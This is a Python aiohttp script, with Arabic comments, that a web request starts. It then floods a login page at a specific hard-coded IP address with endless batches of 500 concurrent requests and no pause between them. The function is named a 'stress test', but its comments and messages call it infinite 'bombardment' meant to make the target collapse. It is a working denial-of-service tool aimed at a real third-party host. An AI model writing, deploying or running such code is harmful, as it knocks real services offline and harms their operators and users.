import asyncio
import aiohttp
from aiohttp import web
import os

TARGET_URL = "http://187.7.17.67/sudani/login2.php"
PAYLOAD = {'account': '123456789', 'password': 'test_password'}

async def send_request(session, index):
    try:
        if index % 2 == 0:
            async with session.post(TARGET_URL, data=PAYLOAD, timeout=2) as response:
                return response.status
        else:
            async with session.get(TARGET_URL, timeout=2) as response:
                return response.status
    except:
        return 0

async def run_infinite_stress_test():
    concurrency_batch = 500  
    # جعل الدفعات غير محدودة (Infinite Loop) لكي يستمر الضغط النفاث دون توقف
    batch = 1
    
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600, force_close=False)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Connection': 'keep-alive'
    }
    
    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        while True: # استمرار القذف اللانهائي
            tasks = [send_request(session, i) for i in range(concurrency_batch)]
            results = await asyncio.gather(*tasks)
            
            success_200 = sum(1 for status in results if status == 200)
            failed = concurrency_batch - success_200
            
            print(f"🔥 [قذف لانهائي - الدفعة {batch}] -> نجاح: {success_200} | إسقاط/انهيار: {failed}", flush=True)
            batch += 1
            # تم حذف فاصل الـ sleep تماماً لضمان التدفق المستمر والضغط المطلق

async def handle(request):
    asyncio.create_task(run_infinite_stress_test())
    return web.Response(text="🚀 تم تشغيل محرك القذف المستمر واللانهائي في الخلفية! راقب انهيار السجلات الآن.")

app = web.Application()
app.router.add_get('/', handle)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 80))
    web.run_app(app, host='0.0.0.0', port=port)
